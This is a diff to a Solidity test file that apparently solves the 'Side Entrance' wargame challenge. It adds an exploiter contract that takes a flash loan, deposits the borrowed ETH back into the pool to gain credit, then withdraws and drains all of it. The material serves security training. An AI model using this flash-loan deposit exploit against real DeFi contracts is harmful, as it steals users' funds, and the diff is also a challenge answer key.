@@ -45,7 +45,16 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        // Create exploiter contract
+        SideEntranceExploiter exploiter = new SideEntranceExploiter(
+            address(pool)
+        );
+
+        // Execute the attack
+        exploiter.attack();
+
+        // Withdraw the ETH to the recovery address
+        exploiter.withdrawToRecovery(recovery);
     }
 
     /**
@@ -53,6 +62,44 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
+}
+
+// Notre contrat d'exploitation qui va utiliser la vulnérabilité de side entrance
+contract SideEntranceExploiter {
+    SideEntranceLenderPool private immutable pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    // Main attack function
+    function attack() external {
+        // 1. Request a flash loan for all ETH in the pool
+        pool.flashLoan(address(pool).balance);
+    }
+
+    // This function is called by the pool during the flash loan execution
+    function execute() external payable {
+        // 2. Instead of directly returning the ETH, deposit it back
+        // This satisfies the flash loan check while crediting our balance
+        pool.deposit{value: msg.value}();
+    }
+
+    // After the attack, withdraw and send to recovery address
+    function withdrawToRecovery(address recovery) external {
+        // 3. Withdraw all ETH based on our credited balance
+        pool.withdraw();
+
+        // 4. Send the drained ETH to the recovery address
+        payable(recovery).transfer(address(this).balance);
+    }
+
+    // Required to receive ETH
+    receive() external payable {}
 }
